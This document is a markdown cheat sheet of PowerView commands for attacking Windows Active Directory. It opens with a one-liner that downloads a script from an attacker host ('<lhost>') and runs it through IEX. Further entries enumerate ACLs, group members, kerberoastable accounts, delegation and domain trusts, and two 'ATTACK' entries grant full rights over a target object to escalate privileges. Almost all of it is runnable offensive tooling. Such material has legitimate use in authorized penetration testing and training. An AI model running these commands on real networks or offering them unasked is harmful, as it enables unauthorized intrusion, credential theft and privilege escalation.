# powerview

% ad, windows, powerview

## load from remote
#plateform/windows #target/remote  #cat/RECON 

https://github.com/PowerShellMafia/PowerSploit/

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
```

## Set alternative creds to use
#plateform/windows #target/remote  #cat/RECON 
Example : Use with commands as "-Credential $creds"

```powershell
$passwd = ConvertTo-SecureString <password> -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential (<domain\user>, $passwd)
Get-DomainUser -Credential $Cred
```

## Get User from SID
#plateform/windows #target/remote  #cat/RECON 
```powershell
ConvertFrom-SID <sid>
```

## Find user ACL 
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

## Find all domain user ACL
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Add user DACL
#plateform/windows #target/remote  #cat/ATTACK
```powershell
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <current_user> -Rights All
```

## Find all groups our current user got access
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Find all users our current user got access
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```


## Add GenericAll to target for user
#plateform/windows #target/remote  #cat/ATTACK/EXPLOIT 
```powerview
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All
```

## Find all Computer with unconstrained delegation
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainComputer -Unconstrained
```

## Get all domain trust 
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainTrustMapping
```

## Get all members of a a given group
#plateform/windows #target/remote  #cat/RECON 
Example: Get-DomainGroupMember "Domain Admins" -Recurse

```powershell
Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain> -Recurse
```



## Get list of kerberoastable users
#plateform/windows #target/remote  #cat/RECON 
Description : The following will enumerate 'Kerberoastable' users for a given domain

```powershell
Get-NetUser -Domain <domain> | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname 
```
